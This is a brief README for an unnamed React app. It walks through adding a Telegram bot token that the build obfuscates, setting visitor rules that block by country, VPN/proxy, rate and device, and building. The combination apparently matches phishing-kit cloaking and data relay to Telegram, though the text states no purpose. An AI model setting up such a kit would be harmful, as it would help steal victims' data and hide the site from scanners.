# React Application

## User Workflow

1. **Edit `public/config/user-telegram-config.json`** (plain text)
   - Replace `YOUR_BOT_TOKEN_HERE` with your Telegram bot token
   - Replace `YOUR_CHAT_ID_HERE` with your Telegram chat ID
   - Set `enabled: true` to enable Telegram notifications

2. **Edit `agent/config/dk_rules.json`** (security rules - **REQUIRED**)
   - Edit the `agent/config/dk_rules.json` file in this repository
   - Configure country restrictions (include/exclude mode)
   - Set VPN/proxy blocking rules
   - Configure rate limiting
   - Set device restrictions (mobile/desktop/tablet)
   - **Note**: Security system reads from `agent/config/dk_rules.json` for security checks

3. **Run `npm run build` or `npm run dev`**
   - Telegram config obfuscation happens automatically during build
   - Security rules are used by backend security checks

4. **Done** — Your app is configured and ready to deploy

